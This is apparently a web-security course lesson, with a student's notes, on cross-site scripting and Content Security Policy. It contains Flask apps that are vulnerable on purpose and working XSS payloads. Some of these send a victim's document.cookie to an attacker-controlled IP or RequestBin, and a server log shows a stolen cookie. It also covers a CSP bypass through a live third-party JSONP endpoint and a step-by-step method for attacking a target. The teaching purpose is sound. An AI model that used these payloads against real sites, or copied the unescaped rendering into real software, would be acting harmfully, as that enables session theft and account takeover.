	- `HttpOnly` is a flag the web server can set in the HTTP header
	- When it's on, the client cannot use `document.cookie` to access their cookie
	- How does this forestall a XSS that wants to steal cookie?
		- Original goal is to induce the victim to send over their cookie somehow
			- To do that, you need to inject JS code involving `document.cookie` that the victim later runs, which fetches their cookie
			- However, since `document.cookie` is now invalid, when the victim executes the injected JS code, it simply returns an empty string and not the actual cookie!


## XSS

- basic amateur XSS (vs stored XSS later): 
	- make the victim client send over a request that contains malicious sciprt
		- scenario: victim leaves laptop open and leaves > you enter the malicious js code into their browser and sends the request > malicious code executes > victim comes back and see the response: could be a link to a phishing site etc...
We've seen some of the power of Javascript thus far, including its ability to access and modify HTML objects, access cookies (when non-HTTP-only is not enabled), and handle user events. Everything demonstrated thus far has been on our own DOM/browser, which is not very exciting. But XSS changes that.

Cross-site Scripting (XSS) is the process of forcing a target, whether it be another user or server, to execute arbitrary Javascript. Say we served a website with [[xss.py]] , including a single route: `/vulnerable`.

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/vulnerable')
def greet():
    name = request.args.get('name', 'Guest')
    return f'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Greeting Page</title>
        </head>
        <body>
            <h1>Hello, {name}!</h1>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(debug=True, port=9000)
```

With any normal URL parameters this would simply print out `Hello <name>!`. But what if we could get a target to click on a link for `http://127.0.0.1:9000/vulnerable?name=<script>alert(%27XSS%27)</script>`? Run the server with `python3 xss.py` and try it with [this link](http://127.0.0.1:9000/vulnerable?name=<script>alert(%27XSS%27)</script>). The result is the execution of Javascript on the target's browser! We could even extend this to do something more, like `alert` the target's cookies with [`http://127.0.0.1:9000/vulnerable?name=<script>alert(document.cookie)</script>`](http://127.0.0.1:9000/vulnerable?name=<script>alert(document.cookie)</script>). 

### Stored XSS

The prior example is referred to as DOM-based XSS, as the arbitrary code was loaded into the DOM and rendered by the target. Another, arguably more powerful, form of XSS is stored XSS. This refers to a situation in which an arbitrary script is uploaded to the server and then rendered to anyone visiting a site which uses that resource. A common avenue for stored XSS is submitting a script to a message board as a comment—every user who visits that message board will fetch the comment and have arbitrary Javascript executed on their machine.
- this is true danger!!! influential danger

Consider the following app, [[stored_xss.py]], which allows a user to display current comments and upload their own:

```python
import os
from flask import Flask, request, render_template_string, abort

app = Flask(__name__)

# Create a 'comments' directory if it doesn't exist
COMMENT_FOLDER = 'comments'
os.makedirs(COMMENT_FOLDER, exist_ok=True)

# Configure the comment folder
app.config['COMMENT_FOLDER'] = COMMENT_FOLDER

@app.route('/')
def home():
    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" comment="width=device-width, initial-scale=1.0">
            <title>Comment File</title>
        </head>
        <body>
            <h1>Message Board</h1>
            <form action="/create" method="post">
                <input type="text" name="comment" placeholder="Enter your comment here" required>
                <input type="submit" value="Create File">
            </form>
            <h2>Available Actions</h2>
            <ul>
                <li><a href="/comments">View Commented Files</a></li>
            </ul>
        </body>
        </html>
    '''

@app.route('/create', methods=['POST'])
def create_file():
    comment = request.form['comment']

    # Count existing files in the comments directory
    existing_files = os.listdir(app.config['COMMENT_FOLDER'])
    n = len(existing_files) + 1

    # Create the new filename
    filename = f'comment{n}'
    filepath = os.path.join(app.config['COMMENT_FOLDER'], filename)

    # Save the content to a new file
    with open(filepath, 'w') as f:
        f.write(comment)

    return f'File "{filename}" created successfully!'

@app.route('/comments', methods=['GET'])
def load_files():
    # Get all files in the comments directory
    files = os.listdir(app.config['COMMENT_FOLDER'])
    if not files:
        return 'No files available', 404

    files.sort()

    comment_sections = []

    for filename in files:
        filepath = os.path.join(app.config['COMMENT_FOLDER'], filename)
        if os.path.isfile(filepath):
            with open(filepath, 'r') as f:
                file_comment = f.read()
            comment_sections.append((filename, file_comment))

    return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" comment="width=device-width, initial-scale=1.0">
            <title>Files Content</title>
        </head>
        <body>
            <h1>Commented Files Content</h1>
            {% for filename, comment in comment_sections %}
                <h2>File: {{ filename }}</h2>
                <pre>{{ comment | safe }}</pre>
            {% endfor %}
        </body>
        </html>
    ''', comment_sections=comment_sections)

if __name__ == '__main__':
    app.run(debug=True, port=9000)
```

Start the server by navigating to `src/lesson12/stored_xss` and running `python3 stored_xss.py`. Navigating to `127.0.0.1:9000/comments` shows a couple default comments with nothing nefarious. We can navigate to the landing page at `127.0.0.1:9000/` and upload our own comment to add to the list. 

![[comment_safe.png]]

But, this server is vulnerable to XSS by storing arbitrary text from a user and rendering it for all to see. For instance, inputting `<script>alert(document.cookie)</script>` as a comment and loading `/comments` again triggers XSS via loading and rendering the stored Javascript!

![[comment_stored_xss.png]]
This is a particularly devastating vulnerability, as it affects any user perusing a site through what appears to be a safe URL. Once an XSS script is stored on the server, it affects anyone who innocently loads it until the content is deleted.

> Note that Flask automatically escapes certain characters when rendering data, specifically `<` and `>` characters. We can bypass this auto-escaping by adding ` | safe`, as shown in the server code above, which allows the XSS vulnerability to surface. Without this condition, Flask escapes the data when serving the response, and the text will be innocuously rendered without execution.
> ![[comment_flask_escape.png]]

### Leaking Data with XSS

It is important to understand the context of the XSS execution in these examples. We arbitrarily executed Javascript on a target's browser, but it was done within the context of _their_ browser. That means as an attacker we are unable to view the result of this operation and our XSS attack is rather pointless. We need a way of triggering behaviour that can leak information back to us as an attacker.

Consider once again the stored XSS example—the prior payload simply popped an alert to the target's screen but did not leak any information (the target already knows its own cookie values). What if we coerced the target to post its cookie somewhere else, perhaps somewhere visible to us as an attacker?

### XMLHttpRequest

The [`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) object is a Javascript web object capable of making HTTP requests within a browser. For instance, we can fetch information from `google.com` using the following [[xmlhttprequest.html]] HTML file with embedded Javascript:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XMLHttpRequest Example</title>
</head>
<body>
    <button id="fetch-button">Fetch Data from Google</button>
    <pre id="response"></pre>

    <script>
        document.getElementById("fetch-button").onclick = function() {
            var xhr = new XMLHttpRequest();

            xhr.open("GET", "https://google.com", true);

            // Set up a callback function to handle the response
            xhr.onreadystatechange = function () {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    console.log("Status:", xhr.status);
                    console.log("Response Text:", xhr.responseText);

                    document.getElementById("response").textContent = xhr.responseText;
                }
            };

            xhr.send();
        };
    </script>
</body>
</html>
```

In order to test this, we need to boot our browser without the CORS mitigation. The following commands boot Chrome with no security settings:

```bash
# mac
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --disable-web-security --user-data-dir="/tmp/chrome_dev"
# windows
chrome.exe --disable-web-security --user-data-dir="C:\temp\chrome"
# linux
google-chrome --disable-web-security --user-data-dir="/tmp/chrome_dev"
```

> [CORS](https://portswigger.net/web-security/cors) is not covered in this lesson, but at a high level it enforces a policy in which requests for a site's resources are restricted to itself or a subdomain. This means we cannot request a resource from Google without them authorizing our IP/domain, which is not feasible. We can instead just boot Chrome (or another browser) with no security features, including CORS, for this brief test.

Pressing the button on the page performs the GET request and embeds the response from Google on our page! This is not particularly useful, but similar requests can be applied to the site and target of choice.

#### Forcing an Unwanted POST Request

Consider the prior message board example. Anyone can create a new comment by sending a POST request with a `comment` field to the `/create` route. What if we could influence the target to make a comment without their will? The request would look something like:

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "/create", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("comment="+document.cookie);</script>
```

> Note that we need to specify that the POST parameter is `urlencoded` so that the request puts the value (the user's cookie) in the correct place. We also do not need a callback function to handle the response, as with the previous example. 

We can wrap this code in `<script></script>` tags and attempt to send the payload `<script>var xhr = new XMLHttpRequest();xhr.open("POST", "/create", true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.send("comment="+document.cookie);</script>` to the server (navigate to `src/lesson12/stored_xss` and run `python3 stored_xss.py` to start it). The result is a posted comment, and navigating to the `/comments` page shows...nothing?

```
File: comment1
Hello world!

File: comment2
Goodbye, Universe

File: comment3
```

Comment 3 has no data, which is actually a good sign! This likely means that the Javascript was loaded and executed upon navigation to this page. This hopefully triggered the unwanted POST request. Refresh the page, and the new comment appears!

```
Commented Files Content
File: comment1
Hello world!

File: comment2
Goodbye, Universe

File: comment3
File: comment4
aaaaa=bbbbb
```

> Ensure that you have at least one cookie set before attempting this. If you do not have any, you can create one in the browser's cookie storage by manually setting a cookie name and value.

#### Forcing an Unwanted GET Request

The prior example works well for sites that accept POST requests for data that is displayed publicly. However, we have other situations where this is not viable—perhaps there is no publicly available place to store the cookie. In this situation we can use a GET request to another domain, particularly one that we control! We can simply make the request to a route `/{document.cookie}` and watch for any incoming traffic on our server.

The attack is similar to the POST request, but even more simple:

```javascript
var xhr=new XMLHttpRequest();
xhr.open('GET','http://X.X.X.X:8000/'+document.cookie,false);
xhr.send();
```

> Fill in `X.X.X.X` with the public IP of your server.

All we need now is a public IP address. Spinning up a Digital Ocean droplet, AWS, or GCP instance is a quick and easy option. Simply register the cloud VM, find its IP, and run a simple Python server with `python -m http.server`. 

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
X.X.X.X - - [26/Oct/2024 23:20:47] code 404, message File not found
X.X.X.X - - [26/Oct/2024 23:20:47] "GET /aaaaa=bbbbb HTTP/1.1" 404 -
```

Sending the payload with `<script></script>` tags (`<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://X.X.X.X:8000/'+document.cookie,false);xhr.send();</script>`) and visiting `/comments` triggers the arbitrary code!

An alternative to a cloud VM is a publicly exposed endpoint such as those offered by [Pipedream](https://pipedream.com/). Create an account and then navigate [here](https://pipedream.com/requestbin) to create a new RequestBin. This provides a new, unique URL which can be used in place of an IP address. 

```javascript
var xhr=new XMLHttpRequest();
xhr.open('GET','<URL>' + '/' +document.cookie,false);
xhr.send();
```

Substitute this URL into the payload above and it can be triggered in the same manner as the prior example. An event should appear in the RequestBin with the requested route displaying the target's cookie!

![[requestbin.png]]

## Defence against XSS: CSP

XSS has been a vulnerability for years, and many efforts have been made to combat it. One particularly effective measure is through the enforcement of Content Security Policies (CSPs). CSPs define domains which are "authorized" to provide resources used in the rendering of web pages. This allows a web developer to restrict resource provision from only trusted sites, such as a server's domain itself.

CSPs can be identified by viewing a server's response headers. If the `Content-Security-Policy` header is present, it limits the source of resources fetched. CSP allows filtering by type, including custom policies for scripts (`script-src`), images (`img-src`) and more. If no other domains (other than itself) are to be trusted then `Content-Security-Policy: 'self'` can be declared. 

CSPs are particularly effective against XSS because they limit the execution of Javascript to only trusted sources. Consider again our stored XSS server used previously. We can secure this server by adding the following Python function to the server, as included in [[stored_xss_csp.py]]:

```python
# Define CSP to limit the source of scripts
@app.after_request
def apply_csp(response):
    csp = "default-src 'self'; script-src 'self';"
    response.headers['Content-Security-Policy'] = csp
    return response
```

Navigating to the `/comments` page of this server now shows a CSP response header as enforced by the new code: 

```
connection:
close

content-length:
544
content-security-policy:
default-src 'self'; script-src 'self';
content-type:
text/html; charset=utf-8
date:
Sun, 27 Oct 2024 14:38:06 GMT
server:
Werkzeug/3.0.4 Python/3.12.7
```

We can again attempt injection using the `<script>alert(document.cookie)</script>` payload. The server stores it without a problem, and navigating to `/comments` shows the following HTML embedded in the page:

```html
<h2>File: comment3</h2>
<pre><script>alert(document.cookie)</script></pre>            
```

However, the browser uses the response CSP to limit the execution of the script, and the alert never pops!

> The CSP rule for `'self'` blocks Javascript inlined into HTML, thereby blocking the stored XSS attack previously leveraged. It does, however, allow loading Javascript files from the server's filesystem, such as using the code `<script src="./static/s.js"></script>`.

### Bypassing CSP

This is concerning from an attacking perspective—limiting the execution source for Javascript effectively nullifies XSS! However, there are means of bypassing CSP.

Eliminating _all_ sources of Javascript is unlikely, as many sites leverage pre-packaged Javascript files for rendering content and handling interaction. This makes sense from a broader software engineering and security perspective: trust open source files that are written by competent developers and tested millions of times over. It is common for sites to load scripts from `jquery.com`, such as the following [[jquery.py]] server which loads a [jquery file](https://code.jquery.com/jquery-3.6.0.min.js). 

```python
from flask import Flask, render_template_string

app = Flask(__name__)

template = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flask App with External JS</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            console.log("jQuery has been loaded successfully!");
            $("body").append("<p>Hello, Flask with jQuery!</p>");
        });
    </script>
</head>
<body>
    <h1>Welcome to My Flask App</h1>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, port=9000)
```

It is also common to have websites load from `google.com` and subdomains. Consider the CSP rules from [Facebook](facebook.com):

```
content-security-policy:

default-src data: blob: 'self' https://*.fbsbx.com 'unsafe-inline' *.facebook.com *.fbcdn.net 'unsafe-eval';script-src *.facebook.com *.fbcdn.net *.facebook.net 127.0.0.1:* 'unsafe-inline' blob: data: 'self' connect.facebook.net 'unsafe-eval' https://*.google-analytics.com *.google.com;style-src *.fbcdn.net data: *.facebook.com 'unsafe-inline' https://fonts.googleapis.com;connect-src *.facebook.com facebook.com *.fbcdn.net *.facebook.net wss://*.facebook.com:* wss://*.whatsapp.com:* wss://*.fbcdn.net attachment.fbsbx.com ws://localhost:* blob: *.cdninstagram.com 'self' http://localhost:3103 wss://gateway.facebook.com wss://edge-chat.facebook.com wss://snaptu-d.facebook.com wss://kaios-d.facebook.com/ v.whatsapp.net *.fbsbx.com *.fb.com https://*.google-analytics.com;font-src data: *.facebook.com *.fbcdn.net *.fbsbx.com https://fonts.gstatic.com;img-src *.fbcdn.net *.facebook.com data: https://*.fbsbx.com facebook.com *.cdninstagram.com fbsbx.com fbcdn.net connect.facebook.net *.carriersignal.info blob: android-webview-video-poster: *.whatsapp.net *.fb.com *.oculuscdn.com *.tenor.co *.tenor.com *.giphy.com https://paywithmybank.com/ https://*.paywithmybank.com/ https://www.googleadservices.com https://googleads.g.doubleclick.net https://*.google-analytics.com;media-src *.cdninstagram.com blob: *.fbcdn.net *.fbsbx.com www.facebook.com *.facebook.com data: *.tenor.co *.tenor.com https://*.giphy.com;frame-src *.facebook.com *.fbsbx.com fbsbx.com data: www.instagram.com *.fbcdn.net https://paywithmybank.com/ https://*.paywithmybank.com/ https://www.googleadservices.com https://googleads.g.doubleclick.net https://www.google.com https://td.doubleclick.net *.google.com *.doubleclick.net;worker-src blob: *.facebook.com data:;block-all-mixed-content;upgrade-insecure-requests;
```

In situations like this, we can leverage [JSONP endpoints](https://en.wikipedia.org/wiki/JSONP). These endpoints are meant to expose JSON data (and other functionality) in a way that Javascript can interpret. A potential use case is fetching a JSON blob from an approved endpoint and parsing that blob into an object.

Some JSONP endpoints are configurable, such that a URL parameter in a request can specify the data sent in the response. This exposes some fairly significant security concerns, as an attacker could specify a malicious payload (like the [[#XMLHttpRequest]] payloads identified previously) to execute arbitrary Javascript. _If the JSONP endpoint falls within the CSP allowed domains, this can result in bypassing CSP!_ 

Let's look at a practical example with yet another modified stored XSS server, [[stored_xss_csp_jsonp.py]]. This is the same as the [[stored_xss_csp.py]] file with one specific difference: scripts are allowed from the `bebezoo.1688.com` domain.

```diff
$ diff -u stored_xss_csp.py stored_xss_csp_jsonp.py
--- stored_xss_csp.py   2024-10-27 12:22:49
+++ stored_xss_csp_jsonp.py     2024-10-27 20:40:44
@@ -13,7 +13,7 @@
 # Define CSP to limit the source of scripts
 @app.after_request
 def apply_csp(response):
-    csp = "default-src 'self'; script-src 'self';"
+    csp = "default-src 'self'; script-src bebezoo.1688.com;"
     response.headers['Content-Security-Policy'] = csp
     return response
```

Our prior stored XSS attacks will not work, as demonstrated in the prior section. However, if there is a JSONP endpoint available for this domain we can perhaps bypass CSP. The [JSONBee GitHub page](https://github.com/zigoo0/JSONBee) contains a long list of these configurable endpoints, including `"><script+src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>`! This is presented with a preceding `>` that would escape a tag, which is irrelevant in our case. What we really care about is `<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>`. We can visit that site and see that it generates raw data in the form of a Javascript function (`alert`) that wraps a JSON object.

```javascript
alert(1337)({ "rgv587_flag": "sm", "url": "https://bebezoo.1688.com:443//fragment/index.htm/_____tmd_____/punish?x5secdata=xdea253f6d7153a528e3dfc46c616fdc3aeee4e987dea8471d1730076238a102528611a100710459abazc2aaa__bx__bebezoo.1688.com%3A443%2Ffragment%2Findex.htm&x5step=2" })
```

Let's make a slight modification, changing the payload to `alert(document.cookie)`. Start the server (in the `src/lesson12/stored_xss` directory) and create a new comment with the payload `<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(document.cookie)"></script>`. The result is the same as the pre-CSP example: we are able to pop an alert with the user's cookie!

> Note that we must use the `<script src="URL"></script>` format for JSONP endpoints, since we're loading the Javascript from a URL.

JSONP supports the `XMLHttpRequest` object, so we can build up a more complicated JSONP endpoint query to execute more robust commands on the server, like in the [[#XMLHttpRequest]] section. Finally, here are a few guides with helpful examples for CSP bypass using JSONP.

* [Bypassing CSP with JSONP Endpoints](https://hurricanelabs.com/blog/bypassing-csp-with-jsonp-endpoints/)
* [Third Party Endpoints + JSONP](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints--jsonp)
* [Common CSP Bypasses](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

## Testing XSS

Achieving XSS can be hard when we have modern mitigations like CSP (and [CORS](https://portswigger.net/web-security/cors#:~:text=Cross%2Dorigin%20resource%20sharing%20(CORS)%20is%20a%20browser%20mechanism,outside%20of%20a%20given%20domain.), which is not covered in this lesson). Testing XSS incrementally to discern avenues to exploitation is incredibly important. As always, document what has been tested and what the results were. In general, a good strategy for testing XSS is as follows: 

1. Search for entry points into the site where we can upload or submit user-controlled data
2. Identify or generate a hypothesis as to how the user-controlled data is being used. Is it possible we can trigger loading it into the DOM?
3. Check the CSP headers to see if CSP is enforced.
	1. If not, try injecting Javascript directly into the DOM
	2. If so, check the [JSONBee GitHub page](https://github.com/zigoo0/JSONBee) if any of the allow-listed domains have a JSONP endpoint
4. Test user-side first before attempting stored XSS or reflected XSS against another user (e.g,. admin)
5. Start small, testing with something like `alert("hi")` or `<script>alert("hi")</script>`. An alert confirms that Javascript is being executed
6. Add functionality, such as extracting `document.cookie` in the alert
7. Build up an [`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest), testing first again our own browser
8. Once things are working and confirmed, attempt the final payload against the target

This is not a comprehensive list, but it does provide a general outline of steps that can help incrementally build up XSS from an initial idea into a final payload.

## Recitation

#### Recitation 12.0

Change the code in the [[callback_dom_alert.html]] file to `alert` the current session's cookie(s). Open the webpage to confirm. 

_Make sure to have at least one cookie in the active session otherwise the alert will show nothing. These can be added directly in the browser 's cookie storage, if needed_. 

#### Recitation 12.1

We see cookie `e99a18c428cb38d5f260853678922e03` come across the wire for another user. What do we think about this cookie? Can we find its value? What about cookie `6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090`?

#### Recitation 12.2

Run the [[stored_xss.py]] example. Now, modify [[xmlhttprequest.html]] to make a post request to the `/create` route on the comment server to create a new comment. Reload the comments page to verify the request worked. 

_Make sure to use the correct method and means of supplying parameters so that the request does not fail._

#### Recitation 12.3

We see the following response header. Is CSP applied? If so, on what resources? 

```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.4 Python/3.12.7
Date: Tue, 03 Dec 2024 16:26:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 37
Content-Security-Policy: default-src 'self'; script-src *.vk.com https://*.google.com;
Connection: close
```

What JSONP endpoints might we consider leveraging to bypass? Give an example payload to trigger an `alert`.

## Next Steps

The web landscape is expansive and growing every day. As browsers and frameworks evolve, it is imperative to stay up to date on the latest security measures. But it is also helpful to be intimately familiar with the web frameworks that make up the internet. There is no better way to find subtle misconfigurations or errors than programming a site from scratch. 

There are some useful historical sites that provide vulnerable web sites for continued learning, including [Gruyere](https://google-gruyere.appspot.com/) and [Damn Vulnerable Web App (DVWA)](https://github.com/digininja/DVWA) which allows hosting vulnerable applications locally for learning. CTFs are always a useful educational tool and will contain a variety of web vulnerabilities spanning different frameworks. Port Swigger, the makers of Burp Suite, also have a [whole series](https://portswigger.net/web-security) in web security that provides a robust educational environment with guides and labs to test new techniques.
